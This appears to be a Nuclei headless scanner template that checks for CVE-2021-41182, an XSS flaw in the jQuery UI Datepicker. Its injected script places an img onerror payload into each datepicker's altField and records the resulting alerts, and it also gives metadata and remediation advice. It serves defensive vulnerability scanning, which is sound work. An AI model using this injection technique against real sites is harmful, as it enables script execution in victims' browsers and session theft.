headless:
- extractors:
  - kval:
    - alerts
    part: alerts
    type: kval
  matchers:
  - part: alerts
    type: word
    words:
    - XSS detected on element ID
  steps:
  - action: setheader
    args:
      key: User-Agent
      part: request
      value: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0
  - action: navigate
    args:
      url: '{{BaseURL}}'
  - action: waitload
  - action: script
    args:
      code: "() => {\n  const windowAlert = window.alert;\n  window.alerts = [];\n\
        \n  window.alert = function(message) {\n    console.log(`window.alert called\
        \ with message: ${message}`);\n    window.alerts.push(message);\n    //return\
        \ windowAlert(message);\n  };\n}\n"
      hook: true
  - action: script
    args:
      code: "window.onload = function(){\n\n  let elems = document.getElementsByClassName('hasDatepicker');\n\
        \n  console.log(elems);\n\n  const datepickers = [];\n\n  for (elem of elems)\
        \ {\n    console.log(elem);\n    \n    //sanity check\n    try {\n       \
        \ var dp = window.$.datepicker._getInst(elem);\n    } catch (error) {\n  \
        \      console.log(\"No associated datepicker object\");\n        continue;\n\
        \    }\n\n    //check if datepicker has altField set/in use\n    if (\"altField\"\
        \ in dp.settings) {\n        datepickers.push(dp);\n    }\n  }\n\n  console.log(datepickers);\n\
        \n  for (dp of datepickers) {\n\n    // XSS funni moment\n\n    title = \"\
        XSS detected on element ID: \\\"\".concat(dp.id).concat(\"\\\", \");\n   \
        \ console.log(title);\n    input = `<img onerror='alert(\\`${title}\\`)' src='/404'\
        \ />`;\n\n    dp.settings.altField = input;\n    id = document.getElementById(dp.id);\n\
        \    $(\"#\".concat(dp.id)).datepicker( \"setDate\", \"10/12/2012\" );\n \
        \ }\n\n};\n"
      hook: true
  - action: script
    args:
      code: '() => { return window.alerts }

        '
      hook: true
    name: alerts
id: CVE-2021-41182
info:
  author: aredspy
  classification:
    cpe: cpe:2.3:a:jqueryui:jquery_ui:*:*:*:*:*:jquery:*:*
    cve-id: CVE-2021-41182
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
    cvss-score: 6.5
    cwe-id: CWE-79
    epss-percentile: 0.68538
    epss-score: 0.00279
  description: "JQuery UI before version 1.13.0 contains a Cross-Site Scripting (XSS)\
    \ vulnerability within the altField option of the Datepicker widget. The widget\
    \ does not treat the field as non code input, and so an untrusted input can execute\
    \ arbitrary code.  \n"
  impact: 'Accepting the value of the altField option of the Datepicker widget from
    untrusted sources may execute untrusted code which will run in the victim''s browser
    and lead to potential theft of sensitive information or session hijacking.

    '
  name: JQuery UI <1.13.0 - Datepicker Widget XSS
  reference:
  - https://blog.jqueryui.com/2021/10/jquery-ui-1-13-0-released/
  - https://github.com/jquery/jquery-ui/security/advisories/GHSA-9gj3-hwp5-pmwc
  - https://nvd.nist.gov/vuln/detail/CVE-2021-41182
  remediation: 'Update to the latest version of Jquery UI (>=1.13.0). Alternatively,
    do not accept any value into the altField option from untrusted sources such as
    user input.

    '
  severity: medium
  tags: xss,jquery,cve,cve2021
